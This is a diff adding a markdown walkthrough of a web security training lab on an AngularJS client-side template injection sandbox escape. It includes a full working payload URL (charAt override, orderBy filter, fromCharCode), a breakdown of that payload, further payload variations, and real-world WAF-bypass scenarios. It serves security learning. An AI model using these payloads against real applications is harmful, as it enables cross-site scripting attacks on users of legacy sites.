@@ -9497,3 +9497,529 @@ Immediate execution
 Template literal XSS = inject `${payload}` → instant execution  
 
 ---
+
+# 🐞Lab-24 AngularJS Sandbox Escape 
+
+---
+
+## 🧭 Overview
+
+This lab demonstrates an AngularJS Client-Side Template Injection (CSTI) where:
+
+❌ `$eval()` is disabled  
+❌ Quotes (`' "`) are blocked  
+✔ AngularJS expressions ```{{ }}``` are evaluated  
+
+👉 Goal:
+
+```
+alert(1)
+```
+
+---
+
+## 🧩 What Is This Topic
+
+This is an AngularJS Sandbox Escape  
+
+AngularJS evaluates expressions like:
+
+```
+{{ value }}
+```
+
+It tries to protect against dangerous code  
+
+But we break its validation logic and execute code anyway  
+
+---
+
+## 🔄 Flow
+
+User Input → AngularJS → Sandbox → Bypass → Execution  
+
+---
+
+## 🧠 Source
+
+```
+?search=INPUT
+```
+
+---
+
+## 🧠 Sink
+
+```
+{{value}}
+```
+
+---
+
+## ⚠️ Restrictions
+
+```
+$eval()
+blocked
+
+Quotes (' ")
+blocked
+
+Direct JS execution
+blocked
+
+Angular expressions
+allowed
+
+Filters (orderBy)
+allowed
+```
+
+---
+
+## 🪜 Lab Walkthrough (Step-by-Step — EASY FLOW)
+
+---
+
+### Step 1 — Test Reflection
+
+```
+XSS123
+```
+
+---
+
+### Step 2 — Observe Output
+
+```
+{{value}} → XSS123
+```
+
+---
+
+### Step 3 — Meaning
+
+✔ Input is reflected inside AngularJS expression  
+
+---
+
+### Step 4 — Understand Execution Point
+
+```
+<h1>0 search results for {{value}}</h1>
+```
+
+---
+
+👉 AngularJS EXECUTES whatever is inside:
+
+```
+{{value}}
+```
+
+---
+
+### Step 5 — Try Normal Payload
+
+```
+alert(1)
+```
+
+---
+
+❌ Fails because:
+
+```
+Quotes blocked
+Sandbox restricts execution
+```
+
+---
+
+### Step 6 — Input Length Restriction
+
+```
+Search box limit = 129 characters
+```
+
+---
+
+👉 Solution:
+
+```
+Use URL injection
+```
+
+---
+
+### Step 7 — Final Payload (URL)
+
+```
+https://YOUR-LAB-ID.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+```
+
+---
+
+### Step 8 — Result
+
+```
+alert(1)
+```
+
+👉 Lab solved ✅  
+
+---
+
+## 📸 Screenshots
+
+---
+
+### 1️⃣ Reflection Check
+
+```
+XSS123 → rendered inside {{value}}
+```
+
+![reflection](../images/angular-sandbox-reflection.png)
+
+---
+
+### 2️⃣ Final Payload Execution
+
+```
+Payload executed → alert(1)
+```
+
+![payload](../images/angular-sandbox-final-payload.png)
+
+---
+
+## 💣 Payload Breakdown (SUPER EASY)
+
+---
+
+### 🔹 Part 1 — Create String Without Quotes
+
+```
+toString()
+```
+
+👉 Gives:
+
+```
+"[object Object]"
+```
+
+---
+
+### 🔹 Why
+
+```
+Quotes are blocked → need alternative string creation
+```
+
+---
+
+### 🔹 Part 2 — Access String System
+
+```
+toString().constructor
+```
+
+👉 Gives:
+
+```
+String function
+```
+
+---
+
+### 🔹 Part 3 — Break Security
+
+```
+toString().constructor.prototype.charAt = [].join
+```
+
+---
+
+👉 Meaning:
+
+```
+Replace charAt() → join()
+```
+
+---
+
+💥 Result:
+
+```
+AngularJS validation breaks
+```
+
+---
+
+### 🔹 Part 4 — Trigger Execution
+
+```
+[1] | orderBy: ...
+```
+
+---
+
+👉 Meaning:
+
+```
+Use orderBy filter to execute expression
+```
+
+---
+
+### 🔹 Part 5 — Build Payload Without Quotes
+
+```
+fromCharCode(120,61,97,108,101,114,116,40,49,41)
+```
+
+---
+
+👉 Converts:
+
+```
+120 → x
+61 → =
+97 → a
+108 → l
+101 → e
+114 → r
+116 → t
+40 → (
+49 → 1
+41 → )
+```
+
+---
+
+👉 Final string:
+
+```
+x=alert(1)
+```
+
+---
+
+### 🔹 Part 6 — Final Execution
+
+```
+[1] | orderBy: x=alert(1) = 1
+```
+
+---
+
+👉 Result:
+
+```
+alert(1) executes 💥
+```
+
+---
+
+## 🔗 Full Attack Chain
+
+```
+Input
+→ AngularJS
+→ charAt broken
+→ validation bypass
+→ orderBy executes
+→ fromCharCode builds payload
+→ alert runs
+```
+
+---
+
+## 🌍 Real-World Scenarios (100% Practical)
+
+---
+
+### 🧠 Scenario 1 — Legacy AngularJS Apps
+
+```
+AngularJS < 1.6
+```
+
+Found in:
+
+```
+Dashboards
+Admin panels
+Search filters
+```
+
+---
+
+💥 Attack:
+
+```
+Inject Angular expression → sandbox escape → XSS
+```
+
+---
+
+### 🧠 Scenario 2 — WAF Blocking Quotes
+
+```
+' " < > blocked
+```
+
+---
+
+👉 Bypass:
+
+```
+fromCharCode()
+```
+
+---
+
+### 🧠 Scenario 3 — $eval Disabled
+
+```
+$eval disabled ≠ secure
+```
+
+---
+
+👉 Use:
+
+```
+orderBy
+```
+
+---
+
+### 🧠 Scenario 4 — Input Length Restricted
+
+```
+Short input field
+```
+
+---
+
+👉 Bypass:
+
+```
+Use URL parameters
+```
+
+---
+
+### 🧠 Scenario 5 — Partial Sanitization
+
+```
+alert, script, eval blocked
+```
+
+---
+
+👉 Use:
+
+```
+fromCharCode
+constructor
+prototype
+```
+
+---
+
+## ⚡ Variations of Payloads (IMPORTANT)
+
+---
+
+### ✅ Variation 1
+
+```
+[].toString().constructor.fromCharCode(...)
+```
+
+---
+
+### ✅ Variation 2
+
+```
+[1]|filter:payload
+```
+
+---
+
+### ✅ Variation 3
+
+```
+$event.path.constructor...
+```
+
+---
+
+### ✅ Variation 4
+
+```
+{{constructor.constructor('alert(1)')()}}
+```
+
+(If not blocked)
+
+---
+
+### ✅ Variation 5
+
+```
+'a'.constructor.prototype.charAt = [].join
+```
+
+---
+
+## 🚨 Real Bug Bounty Mindset
+
+---
+
+```
+Do NOT memorize payloads
+```
+
+---
+
+Instead:
+
+```
+1. Where input goes?
+2. Is AngularJS used?
+3. What is blocked?
+4. Can I break validation?
+5. Alternate execution?
+```
+
+---
+
+## 🧠 Mental Model
+
+```
+AngularJS = guard
+charAt = guard’s eyes
+
+Break charAt
+→ guard becomes blind
+→ execution allowed
+```
+
+---
+
+## 🎯 Final Summary
+
+```
+No quotes → use fromCharCode
+No eval → use orderBy
+Sandbox present → break charAt
+
+→ XSS achieved 💥
+```
+
+---
